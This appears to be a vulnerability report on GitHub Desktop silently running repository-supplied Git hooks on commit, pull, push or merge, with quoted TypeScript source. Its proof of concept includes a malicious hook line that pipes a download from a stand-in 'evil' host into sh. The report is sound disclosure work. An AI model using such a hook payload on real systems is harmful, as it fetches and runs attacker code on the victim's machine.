### Title
Silent auto-execution of repository-provided Git hooks after cloning/extracting an attacker-controlled repository — no consent, no unchecked-hook-content warning - (File: `app/src/lib/hooks/get-repo-hooks.ts`, `app/src/lib/hooks/with-hooks-env.ts`)

### Summary
GitHub Desktop's Git-hooks-in-shell-environment feature (added in 3.5.5, enabled by default per `changelog.json` entry "Enable hooks support by default - #21590") scans a repository's hooks directory and transparently executes any hook script it finds whenever Desktop runs `pull`, `push`, `commit`, or `merge`. Discovery of "which hooks exist" is driven entirely by content that ships with the repository (`.git/hooks/*` or a `core.hooksPath` location), and execution happens with no separate user confirmation step distinguishing "this repo defines executable hooks that will now run" from ordinary Desktop operations.

### Finding Description
`getRepoHooks()` [1](#0-0)  resolves the hooks directory for a repository (`core.hooksPath` or the default `.git/hooks`) and yields the names of every file in it that matches a `knownHooks` list and is executable (on POSIX) or simply present (on Windows, since the executable bit isn't checked there: "On Windows we have to assume that any valid hook name is executable" [2](#0-1) ).

`withHooksEnv()` then wires up a local proxy server and rewrites `core.hooksPath` via `GIT_CONFIG_PARAMETERS` so that every discovered hook is intercepted and actually run through `createHooksProxy` for the duration of the git command [3](#0-2) . This is invoked automatically whenever `git()` is called with `interceptHooks` set, which is the case for `commit`, `pull`, `push`, and `merge` [4](#0-3) .

`createHooksProxy` executes the discovered hook binary directly with `spawn(gitPath, args, ...)`, passing along `GIT_*`/`GITHEAD_*` environment variables and the shell environment resolved for the user's configured shell [5](#0-4) . Certain hook failures (including `post-checkout`, `post-merge`, `pre-auto-gc`) are silently ignored by design (`ignoredOnFailureHooks`), meaning a hook that partially executes malicious code and then exits non-zero produces no user-facing warning at all [6](#0-5) .

Crucially, the only "trust" gate that exists in the codebase is the ownership-based "unsafe repository" check surfaced in `AddExistingRepository`/`MissingRepository` ("appears to be owned by another user on your machine. Adding untrusted repositories may automatically execute files in the repository.") [7](#0-6) . That check only fires when the repository's files are owned by a *different OS user* than the current one — it is Git's own `safe.directory` mechanism. It does **not** fire when the current user owns the files, which is exactly the case when a victim downloads and extracts an archive (zip/tarball) that already contains a fully-formed `.git` directory with attacker-authored hook scripts, or clones from a source where the attacker otherwise controls the working tree contents Desktop later treats as "trusted" once added. In that scenario `getRepoHooks` will find the attacker's hooks, and the very next `commit`/`pull`/`push`/`merge` the victim performs in Desktop silently executes them — there is no separate "this repository defines the following hook(s), run them?" prompt anywhere in the flow, only a failure-time dialog (`PopupType.HookFailed`) that fires *after* the hook has already run [8](#0-7) .

The feature is enabled by default (`defaultHooksEnvEnabledValue = enableHooksByDefault()`) [9](#0-8) , so this is not an opt-in power-user feature; ordinary users are exposed automatically.

### Impact Explanation
An attacker who controls the contents of a repository the victim adds/clones (via a crafted archive containing a pre-built `.git` folder, a bare repo, or a repository whose config directs `core.hooksPath` to a version-controlled path) can achieve arbitrary code execution on the victim's machine the first time the victim performs an ordinary Desktop action (commit, pull, push, or merge) in that repository — with the user's full privileges and inheriting the user's shell environment (including PATH, credential helpers, etc., since the hook runs with the resolved shell env plus safe `GIT_*` vars). This goes beyond the classic "malicious repo-side hook is dangerous because you cloned it" caveat that Git itself has always carried, because Desktop actively re-enables and orchestrates hook execution (a feature Desktop did not previously offer) without adding any hook-specific consent UI beyond the pre-existing directory-ownership check, which is inapplicable to the common "downloaded archive I now own" case.

### Likelihood Explanation
Moderate-to-high. The scenario (a user extracts a zip/tarball of a project — a common workflow for "download source code" links, CI artifacts, or contributions shared out-of-band — then adds it via "Add Local Repository", or clones a bare/nested repo) does not require any privileged or unnatural steps; the victim simply performs the everyday actions of committing, pulling, pushing, or merging. Hooks support being on by default (per the changelog) further raises likelihood since users don't need to opt in.

### Recommendation
- Do not treat "same OS-user ownership" as sufficient trust for automatic hook execution; add an explicit, hook-specific consent dialog the first time Desktop detects executable hooks in a repository (listing hook names and, ideally, a diff/preview of their contents) before wiring them into `GIT_CONFIG_PARAMETERS`, similar to how VS Code's "workspace trust" or npm's `ignore-scripts` gate arbitrary script execution from untrusted sources.
- Persist a trust decision per-repository (keyed off repo path + hash of hook file contents) so hooks can't be silently swapped in a later fetch/pull and re-executed without notice.
- Reconsider suppressing hook failures in `ignoredOnFailureHooks` — at minimum surface a non-blocking notice so users know a hook ran even when its exit code is ignored.
- On Windows, actually verify the file has a valid, expected format rather than assuming any file with a known-hook name is executable, since this materially widens the attack surface described above.

### Proof of Concept
1. Attacker builds a project tree with `.git/hooks/post-checkout` (mode 755) containing `#!/bin/sh\ncurl -s https://evil/x | sh &`, and a normal-looking commit history, then packages it as `project.zip`.
2. Victim downloads `project.zip`, extracts it (victim now owns all files — no cross-user ownership mismatch), and in GitHub Desktop chooses "Add Local Repository" pointing at the extracted folder. No "unsafe repository" warning is shown because ownership matches.
3. Victim performs any ordinary action that triggers hook interception, e.g. `git pull` from within Desktop. `pull()` sets `interceptHooks: [... 'post-merge', 'pre-rebase', ...]` [4](#0-3) ; `withHooksEnv` discovers `post-checkout`/related hooks via `getRepoHooks` and stages a proxy that runs them [10](#0-9) .
4. `createHooksProxy` spawns the hook binary with the victim's shell environment [11](#0-10) , executing the attacker's payload with no prior prompt, and since `post-checkout`/`post-merge` failures are explicitly ignored [6](#0-5) , even a hook that errors out after running its payload produces no visible failure dialog.

Note: I was not able to fully trace every call path that could inject `core.hooksPath` purely through a normal `git clone` of a remote (local `.git/config` is regenerated on clone, so the most reliable trigger is a pre-built `.git` directory distributed via archive/bare-clone/local-add rather than a plain HTTPS/SSH clone). This nuance should be validated against the exact repository-acquisition flows Desktop exposes (clone URL vs. add-existing vs. bare-clone-with-embedded-config) before filing, since it affects how "attacker-controlled cloned/fetched repository" is interpreted for scope purposes.

export async function* getRepoHooks(path: string, filter?: string[]) {
  const hooksPath = await getConfigValue(path, 'core.hooksPath')
    .catch(() => getHooksPath(path))
    .then(p => resolve(path, p))

  const files = await readdir(hooksPath, { withFileTypes: true })
    .then(entries => entries.filter(x => x.isFile()))
    .catch(() => [])

  const matchAll = filter?.includes('*')

  for (const file of files) {
    const hookName = basename(file.name, '.exe')

    if (matchAll || filter?.includes(hookName) === false) {
      continue
    }

    if (!knownHooks.includes(hookName)) {
      continue
    }

    if (__WIN32__) {
      // On Windows we have to assume that any valid hook name is executable
      // because the executable bit is not used there. Git looks for a shebang
      // but that seems expensive to check here :shrug:
      yield hookName
    } else if (await isExecutable(join(file.parentPath, file.name))) {
      yield hookName
    }
  }

export async function withHooksEnv<T>(
  fn: (env: Record<string, string | undefined> | undefined) => Promise<T>,
  path: string,
  opts: IGitExecutionOptions | undefined
): Promise<T> {
  if (!opts?.interceptHooks || !getHooksEnvEnabled()) {
    return fn(opts?.env)
  }

  const hooks = await Array.fromAsync(getRepoHooks(path, opts.interceptHooks))

  if (hooks.length === 0) {
    return fn(opts?.env)
  }

  const ext = __WIN32__ ? '.exe' : ''
  const processProxyPath = join(__dirname, `process-proxy${ext}`)

  const token = crypto.randomUUID()
  const tmpHooksDir = await mkdtemp(join(tmpdir(), 'desktop-git-hooks-'))
  const hooksProxy = createHooksProxy(
    cwd =>
      memoizedGetShellEnv(
        getGitHookEnvShell(),
        cwd,
        // We always cache environment per token (i.e. per operation, e.g commit, apply, etc)
        // but we can optionally cache it over multiple operations in the same repository if the user
        // has enabled that setting.
        getCacheHooksEnv() ? 'global' : token
      ),
    tmpHooksDir,
    opts?.onHookProgress,
    opts?.onHookFailure
  )

  const server = createProxyProcessServer(
    conn =>
      hooksProxy(conn).catch(err => {
        log.error(`hooks proxy failed:`, err)
        conn.exit(1).catch(() => {})
      }),
    { validateConnection: async receivedToken => receivedToken === token }
  )
  const port = await new Promise<number>(resolve => {
    server.listen(0, '127.0.0.1', () =>
      resolve((server.address() as AddressInfo).port)
    )
  })
  try {
    for (const hook of hooks) {
      await cp(processProxyPath, join(tmpHooksDir, `${hook}${ext}`))
    }

    const existingGitEnvConfig =
      opts?.env?.['GIT_CONFIG_PARAMETERS'] ??
      process.env['GIT_CONFIG_PARAMETERS'] ??
      ''

    const gitEnvConfigPrefix =
      existingGitEnvConfig.length > 0 ? `${existingGitEnvConfig} ` : ''

    return await fn({
      // TODO: Do we need to escape tmpHooksDir? Could it possibly include a single quote?
      // probably not?
      GIT_CONFIG_PARAMETERS: `${gitEnvConfigPrefix}'core.hooksPath=${tmpHooksDir}'`,
      PROCESS_PROXY_PORT: `${port}`,
      PROCESS_PROXY_TOKEN: token,
    })
